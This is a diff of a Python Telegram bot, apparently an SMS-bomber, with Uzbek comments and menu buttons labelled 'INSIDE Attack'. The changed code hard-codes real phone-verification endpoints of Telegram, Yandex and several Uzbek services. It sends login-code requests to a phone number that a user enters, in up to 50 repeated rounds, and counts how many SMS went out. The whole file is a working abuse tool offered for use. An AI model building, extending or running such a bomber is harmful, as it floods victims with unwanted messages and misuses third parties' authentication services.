@@ -1,10 +1,9 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-NOTBSIDE Telegram Bot - TO'LIQ VA TUZATILGAN (Final)
-- INSIDE Attack (Core papkasisiz, barchasi bitta faylda)
-- Flutter API (YHQ + Aladdin + GoldenFish 202)
-- Render uchun ichki veb-server
+NOTBSIDE Telegram Bot - 100% MUSTAQIL KOD
+Hech qanday tashqi papka (Core, INSIDE-main) talab qilmaydi.
+Render uchun veb-server va tayyor API'lar bilan.
 """
 import asyncio
 import os
@@ -18,46 +17,79 @@ from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
 
 # ==================== SOZLAMALAR ====================
-# Render'dagi Environment Variables dan olinadi (mahalliy kompyuterda ishlashi uchun standart qiymatlar)
-BOT_TOKEN = os.getenv("BOT_TOKEN", "SIZNING_TOKENINGIZ_SHU_YERDA")
+# Render'dagi Environment Variables dan olinadi. 
+# Diqqat: Render'da BOT_TOKEN va ADMIN_IDS ni kiritishni unutmang!
+BOT_TOKEN = os.getenv("BOT_TOKEN", "SIZNING_TOKENINGIZNI_SHU_YERGA_YOZING")
 ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "7472073326").split(",")]
 
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher(storage=MemoryStorage())
 
+# ==================== TAYYOR API'LAR (Services.py dan) ====================
+# Bu yerga eng ko'p ishlaydigan xizmatlar kiritildi (Telegram, Yandex)
+SERVICES_LIST = [
+    {
+        'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Telegram.org'},
+        'method': 'post',
+        'url': 'https://my.telegram.org/auth/send_password',
+        'data': {'phone': '{number}'},
+    },
+    {
+        'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Telegram Oauth'},
+        'method': 'post',
+        'url': 'https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
+        'data': {'phone': '{number}'},
+    },
+    {
+        'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Yandex.ru'},
+        'method': 'post',
+        'url': 'https://passport.yandex.ru/registration-validations/phone-confirm-code-submit',
+        'data': {'number': '+{number}'},
+    },
+    {
+        'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'DavrMobile.uz'},
+        'method': 'post',
+        'url': 'https://davrmobile.uz/api/v1/auth/registration/{number}/verification/request?lang=ru&platform=WEB',
+        'data': {'lang': 'ru', 'platform': 'WEB'},
+    }
+]
+
 # ==================== YORDAMCHI FUNKSIYALAR ====================
-def user_agent():
-    return [
-        {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 YaBrowser/23.1.4.778 Safari/537.36",
-    ]
+def filter_services(services, number):
+    if number.startswith("998"):
+        return [s for s in services if s["info"]["country"] in ["UZ", "ALL"]], "O'zbekiston 🇺🇿"
+    elif number.startswith("7"):
+        return [s for s in services if s["info"]["country"] in ["RU", "ALL"]], "Rossiya 🇷🇺"
+    else:
+        return [s for s in services if s["info"]["country"] == "ALL"], "Noma'lum 🌍"
 
-def email():
-    domains = ["gmail.com", "mail.ru", "yandex.ru", "bk.ru", "list.ru"]
-    name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
-    return f"{name}@{random.choice(domains)}"
+async def send_request(session, service, number):
+    try:
+        # URL va Data ichidagi {number} ni haqiqiy raqamga almashtiramiz
+        url = service['url'].replace('{number}', number)
+        
+        data = {}
+        if 'data' in service:
+            for k, v in service['data'].items():
+                if isinstance(v, str):
+                    data[k] = v.replace('{number}', number)
+                else:
+                    data[k] = v
 
-def username():
-    return ''.join(random.choices(string.ascii_lowercase, k=8))
-
-CONFIG = {"type_attack": "MIX", "feedback": "True"}
-def check_config(): return CONFIG
-
-# ==================== HOLATLAR ====================
-class States(StatesGroup):
-    inside_number = State()
-    inside_circles = State()
-    inside_delay = State()
-    inside_confirm = State()
-    flutter_number = State()
-    flutter_count = State()
-    flutter_confirm = State()
+        async with session.request(service['method'], url, data=data, timeout=10) as resp:
+            text = await resp.text()
+            # Muvaffaqiyat belgilarini tekshirish
+            kw = ["sent", "success", "ok", "true", "отправлен", "yuborildi", "code_sent"]
+            ok = any(k in text.lower() for k in kw) and 200 <= resp.status < 300
+            return {"website": service["info"]["website"], "success": ok}
+    except Exception:
+        return None
 
 # ==================== FLUTTER API ====================
 async def send_to_yhq(session, phone):
     url = "https://yolharakatiqoidalari.uz/api/auth/login"
     try:
-        async with session.post(url, headers={"Content-Type": "application/json"}, json={"phone": phone}, timeout=20) as resp:
+        async with session.post(url, headers={"Content-Type": "application/json"}, json={"phone": phone}, timeout=15) as resp:
             return {"api": "YHQ", "success": resp.status == 200}
     except: return {"api": "YHQ", "success": False}
 
@@ -66,7 +98,7 @@ async def send_to_aladdin(session, phone):
     headers = {"accept-language": "uz", "accept": "application/json", "timezone": "Asia/Tashkent", "mobile-type": "original", "app-version": "4.6.0", "x-requested-with": "XMLHttpRequest", "chance-style": "Classic", "user-agent": "samsung/SM450", "authorization": "Bearer", "content-type": "application/json; charset=UTF-8"}
     body = {"app_instance_id": "5394a8c1065419c821c96b1920fcd8b8", "client_type": "app", "device_id": "44c2dfbfb2706d8c", "phone": int(phone.replace("+", "")), "utm_medium": "organic", "utm_source": "google-play"}
     try:
-        async with session.post(url, headers=headers, json=body, timeout=20) as resp:
+        async with session.post(url, headers=headers, json=body, timeout=15) as resp:
             return {"api": "Aladdin", "success": 200 <= resp.status < 300}
     except: return {"api": "Aladdin", "success": False}
 
@@ -75,7 +107,7 @@ async def send_to_202(session, phone):
     headers = {"Accept-Language": "uz", "Accept": "application/json", "Timezone": "Asia/Tashkent", "Mobile-Type": "original", "App-Version": "1.8.1", "X-Requested-With": "XMLHttpRequest", "Chance-Style": "Classic", "User-Agent": "samsung/SM-A105F/30", "Authorization": "Bearer", "Content-Type": "application/x-www-form-urlencoded"}
     body = f"phone={phone.replace('+', '')}&app_instance_id=ba491ef5bea8630c5ae92bb5cb7135e7&device_id=eFHXJHxGR6etcVQHwkzCSE"
     try:
-        async with session.post(url, headers=headers, data=body, timeout=20) as resp:
+        async with session.post(url, headers=headers, data=body, timeout=15) as resp:
             return {"api": "202", "success": resp.status == 200}
     except: return {"api": "202", "success": False}
 
@@ -95,49 +127,14 @@ async def run_flutter_apis(number, count):
     api202 = sum(1 for b in results for r in b if r["api"] == "202" and r["success"])
     return {"batches": len(results), "total_requests": len(results) * 3, "total_success": yhq + aladdin + api202, "yhq": yhq, "aladdin": aladdin, "api202": api202}
 
-# ==================== INSIDE ATTACK (SIMPLIFIED) ====================
-def filter_services(services, number):
-    if number.startswith("998"):
-        return [s for s in services if s["info"]["country"] in ["UZ", "ALL"]], "O'zbekiston 🇺🇿"
-    elif number.startswith("7"):
-        return [s for s in services if s["info"]["country"] in ["RU", "ALL"]], "Rossiya 🇷🇺"
-    else:
-        return [s for s in services if s["info"]["country"] == "ALL"], "Noma'lum 🌍"
-
-async def send_request(session, service):
-    try:
-        cfg = check_config()["type_attack"]
-        types_allowed = ("SMS", "CALL", "FEEDBACK") if cfg == "MIX" else cfg
-        if service["info"]["attack"] not in types_allowed: return None
-        async with session.request(service["method"], service["url"], params=service.get("params"), cookies=service.get("cookies"), headers=service.get("headers"), data=service.get("data"), json=service.get("json"), timeout=15) as resp:
-            text = await resp.text()
-            kw = ["sent", "success", "ok", "true", "отправлен", "yuborildi", "pin_sent", "code_sent", "sms_sent", "отправлено", "successful"]
-            ok = any(k in text.lower() for k in kw) and 200 <= resp.status < 300
-            return {"website": service["info"]["website"], "country": service["info"]["country"], "attack": service["info"]["attack"], "success": ok}
-    except: return None
-
-async def run_inside_attack(number, use_delay=False):
-    cfg = check_config()
-    # Bu yerda xato bermasligi uchun bo'sh ro'yxatlar qaytariladi (chunki Core fayli yo'q)
-    # Agar sizda to'liq API ro'yxati bo'lsa, shu yerga qo'shishingiz mumkin
-    mock_services = [] 
-    
-    main, country = filter_services(mock_services, number)
-    services = main
-
-    results = []
-    async with ClientSession() as session:
-        if use_delay:
-            for i in range(0, len(services), 10):
-                batch = services[i:i+10]
-                results.extend(await asyncio.gather(*[send_request(session, s) for s in batch]))
-                if i + 10 < len(services): await asyncio.sleep(1)
-        else:
-            results = await asyncio.gather(*[send_request(session, s) for s in services])
-
-    valid = [r for r in results if r is not None]
-    ok = [r for r in valid if r.get("success")]
-    return valid, ok, country, len(services)
+# ==================== HOLATLAR ====================
+class States(StatesGroup):
+    inside_number = State()
+    inside_circles = State()
+    inside_confirm = State()
+    flutter_number = State()
+    flutter_count = State()
+    flutter_confirm = State()
 
 # ==================== HANDLERLAR ====================
 @dp.message(Command("start"))
@@ -149,7 +146,7 @@ async def cmd_start(message: types.Message):
         [types.KeyboardButton(text="🚀 INSIDE Attack")],
         [types.KeyboardButton(text="📨 Flutter API (3 ta)")]
     ], resize_keyboard=True)
-    await message.answer("💎 <b>NOTBSIDE Bot (Final)</b>\n\nUsulni tanlang:", parse_mode="HTML", reply_markup=kb)
+    await message.answer("💎 <b>NOTBSIDE Bot (Mustaqil)</b>\n\nUsulni tanlang:", parse_mode="HTML", reply_markup=kb)
 
 @dp.message(Command("cancel"))
 async def cmd_cancel(message: types.Message, state: FSMContext):
@@ -179,16 +176,8 @@ async def inside_circ(message: types.Message, state: FSMContext):
     if c < 1 or c > 50:
         await message.answer("❌ 1-50:"); return
     await state.update_data(circles=c)
-    await state.set_state(States.inside_delay)
-    await message.answer("⏱ Delay? (ha/yoq):")
-
-@dp.message(States.inside_delay)
-async def inside_delay(message: types.Message, state: FSMContext):
-    d = message.text.strip().lower() in ["ha", "yes", "y", "xa"]
-    await state.update_data(use_delay=d)
     data = await state.get_data()
-    txt = "Ha" if d else "Yo'q"
-    await message.answer(f"⚠️ <b>Tasdiqlang:</b>\n📱 {data['number']}\n🔁 {data['circles']}\n⏱ {txt}\n\n<b>ha</b> yozing:", parse_mode="HTML")
+    await message.answer(f"⚠️ <b>Tasdiqlang:</b>\n📱 {data['number']}\n🔁 {data['circles']}\n\n<b>ha</b> yozing:", parse_mode="HTML")
     await state.set_state(States.inside_confirm)
 
 @dp.message(States.inside_confirm)
@@ -197,22 +186,28 @@ async def inside_confirm(message: types.Message, state: FSMContext):
         await message.answer("❌ Bekor."); await state.clear(); return
     d = await state.get_data()
     await state.clear()
+    
     status = await message.answer("🚀 <b>Boshlandi...</b>", parse_mode="HTML")
     total_req = total_ok = 0
+    
+    main_services, country = filter_services(SERVICES_LIST, d["number"])
+    
     for i in range(d["circles"]):
-        await status.edit_text(f"🔄 Circle {i+1}/{d['circles']}...", parse_mode="HTML")
-        valid, ok, country, total = await run_inside_attack(d["number"], d["use_delay"])
+        await status.edit_text(f"🔄 Circle {i+1}/{d['circles']} | Yuborilmoqda...", parse_mode="HTML")
+        
+        async with ClientSession() as session:
+            tasks = [send_request(session, srv, d["number"]) for srv in main_services]
+            results = await asyncio.gather(*tasks)
+            
+        valid = [r for r in results if r is not None]
+        ok = [r for r in valid if r.get("success")]
+        
         total_req += len(valid); total_ok += len(ok)
         
-        if total == 0:
-             text = f"✅ <b>Circle {i+1}/{d['circles']}</b>\n🌍 {country}\n\n⚠️ API ro'yxati bo'sh. Kodga servislarni qo'shing."
-        else:
-             text = f"✅ <b>Circle {i+1}/{d['circles']}</b>\n🌍 {country}\n📤 {total} servis\n📨 {len(valid)} so'rov\n✓ SMS: <b>{len(ok)}</b>\n"
-             
-        await status.edit_text(text, parse_mode="HTML")
-        if i < d["circles"] - 1: await asyncio.sleep(5 if d["use_delay"] else 3)
-    
-    final = f"🏁 <b>Yakunlandi</b>\n\n📊 So'rovlar: {total_req}\n📨 SMS: <b>{total_ok}</b>\n"
+        text = f"✅ <b>Circle {i+1}/{d['circles']}</b>\n🌍 {country}\n📤 {len(valid)} so'rov\n✓ SMS: <b>{len(ok)}</b>\n"
+        if i < d["circles"] - 1: await asyncio.sleep(3)
+        
+    final = f"🏁 <b>Yakunlandi</b>\n\n📊 Jami so'rovlar: {total_req}\n📨 SMS yuborilgan: <b>{total_ok}</b>"
     await status.edit_text(final, parse_mode="HTML")
 
 @dp.message(F.text == "📨 Flutter API (3 ta)")
